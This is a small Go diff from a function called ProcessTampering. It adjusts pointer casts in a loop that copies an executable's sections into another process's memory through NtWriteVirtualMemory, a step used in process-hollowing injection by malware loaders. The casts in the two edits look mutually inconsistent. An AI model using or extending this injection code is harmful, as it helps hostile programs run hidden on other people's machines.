@@ -419,14 +419,14 @@ func ProcessTampering() {
 	// Write the sections of the target executable into the allocated virtual memory via WriteProcessMemory()
 	for i := 0; i < int(processNTHeaders.IMAGE_FILE_HEADER.NumberOfSections); i++ {
 		sectionHeader := (PIMAGE_SECTION_HEADER)(unsafe.Pointer(
-			image +
+			uintptr(image) +
 				uintptr(processDOSHeader.E_lfanew) +
 				uintptr(unsafe.Sizeof(IMAGE_NT_HEADERS{})) +
 				uintptr(i)*uintptr(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))))
 		_, _, err = ntDLLNtWriteVirtualMemory.Call(
 			uintptr(processInformation.Process),
 			uintptr(processMemory+uintptr(sectionHeader.VirtualAddress)),
-			uintptr(image+uintptr(sectionHeader.PointerToRawData)),
+			uintptr(unsafe.Pointer(image+uintptr(sectionHeader.PointerToRawData))),
 			uintptr(sectionHeader.SizeOfRawData),
 			uintptr(0))
 		if err != syscall.Errno(0) {
